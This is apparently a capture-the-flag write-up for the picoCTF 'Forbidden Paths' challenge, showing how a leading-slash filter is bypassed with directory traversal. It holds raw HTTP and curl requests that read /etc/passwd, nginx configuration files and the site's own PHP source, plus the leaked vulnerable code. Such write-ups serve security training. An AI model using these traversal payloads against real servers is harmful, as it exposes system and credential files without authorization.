# Forbidden Paths

Can you get the flag? Here's the [website](http://saturn.picoctf.net:53295/). We know that the website files live in `/usr/share/nginx/html/` and the flag is at `/flag.txt` but the website is filtering absolute file paths. Can you get past the filter to read the flag?

## Solucion
```bash
POST /read.php HTTP/1.1
Host: saturn.picoctf.net:53295
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Origin: http://saturn.picoctf.net:53295
Connection: close
Referer: http://saturn.picoctf.net:53295/
Upgrade-Insecure-Requests: 1

filename=../../../../../etc/passwd&read=

```

```
filename=../../../../../usr/share/nginx/html/read.php&read=

<br>  <body>
<br>    
<br>    <?php
<br>      $firstChar = $_POST['filename'][0];
<br>      
<br>      if( strcmp($firstChar, '/') == 0 )
<br>      {
<br>        echo "Not Authorized";
<br>      }
<br>      else
<br>      {
<br>        if (file_exists($_POST['filename'])) {
<br>
<br>          $file = fopen($_POST['filename'], 'r');
<br>
<br>          while(! feof($file))
<br>          {
<br>            $line = fgets($file);
<br>            echo $line. "<br>";
<br>          }
<br>
<br>          fclose($file);
<br>        } else {
<br>          echo "File does not exist";
<br>        }
<br>      }
<br>    ?>
<br>  </body>

```


```
curl http://saturn.picoctf.net:53295/read.php -d 'filename=../../../../../etc/nginx/nginx.conf'

```
```
curl http://saturn.picoctf.net:53295/read.php -d 'filename=../../../../../etc/nginx/conf.d/default.conf'
```


Referencias

- https://www.plesk.com/blog/various/nginx-configuration-guide/
